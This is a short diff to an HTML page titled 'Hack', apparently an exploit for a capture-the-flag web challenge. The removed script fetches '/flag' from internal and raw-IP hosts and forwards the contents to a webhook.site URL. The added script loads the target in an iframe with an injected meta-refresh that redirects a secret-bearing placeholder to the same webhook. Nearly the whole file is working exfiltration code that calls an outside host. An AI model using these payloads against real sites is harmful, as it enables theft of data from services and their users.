@@ -6,15 +6,18 @@
     <title>Hack</title>
 </head>
 <body>
-    <script>
-        async function hack(link,_id ){
-            var result = await fetch(link);
-            var flag = await result.text();
-            fetch("https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/flag"+_id+"="+flag);
-        }
-        hack("http://web:8001/flag", "1");
-        hack("/flag", "2");
-        hack("http://91.107.157.58:8001/flag","3")
-    </script>
+<script>
+const HOOK_URL = "https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db";
+const main = async () => {
+  const elm = document.createElement("iframe");
+  elm.src = "http://91.107.157.58:8000/?content_type=text/html&letter=" +
+    encodeURIComponent(
+      `<meta http-equiv="Refresh" content="0; URL=${HOOK_URL}/?q=$gift$">`
+    );
+  elm.referrerPolicy = "no-referrer";
+  document.body.appendChild(elm);
+};
+main();
+</script>
 </body>
 </html>
